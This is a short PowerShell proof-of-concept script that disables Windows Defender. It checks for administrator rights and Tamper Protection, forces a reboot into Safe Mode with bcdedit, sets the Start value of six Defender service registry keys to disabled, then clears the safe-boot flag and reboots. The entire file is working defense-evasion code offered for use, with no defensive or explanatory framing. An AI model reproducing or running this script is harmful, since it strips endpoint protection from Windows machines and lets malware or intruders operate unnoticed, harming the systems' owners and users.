# POC to disable Defender through Safe Mode

# Check if running as administrator
$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
$isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "Please run this script as an administrator."
    exit
}

# Check if Windows Defender is disabled
$realtimeMonitoring = (Get-MpPreference).DisableRealtimeMonitoring

if ($realtimeMonitoring -eq $true) {
    Write-Host "Windows Defender is already disabled."
    exit
}

# Check Tamper Protection status
$tamperProtection = (Get-MpComputerStatus).IsTamperProtected

if ($tamperProtection -eq $true) {
    Write-Host "Tamper Protection is enabled. Please disable it before running this script."
    exit
}

# Check if in Safe Mode
$bootEntry = cmd /c "bcdedit /enum {current}"
$safeMode = $bootEntry -match "safeboot"

if (-not $safeMode) {
    cmd /c "bcdedit /set {default} safeboot network"
    Restart-Computer
}

# Modify registry keys
$services = @(
    "HKLM:\SYSTEM\CurrentControlSet\Services\Sense",
    "HKLM:\SYSTEM\CurrentControlSet\Services\WdBoot",
    "HKLM:\SYSTEM\CurrentControlSet\Services\WdFilter",
    "HKLM:\SYSTEM\CurrentControlSet\Services\WdNisDrv",
    "HKLM:\SYSTEM\CurrentControlSet\Services\WdNisSvc",
    "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend"
)

foreach ($service in $services) {
    Set-ItemProperty -Path $service -Name "Start" -Value 4
}

Write-Host "Registry keys have been updated. Windows Defender services are now disabled."

cmd /c "bcdedit /deletevalue {default} safeboot"
Restart-Computer
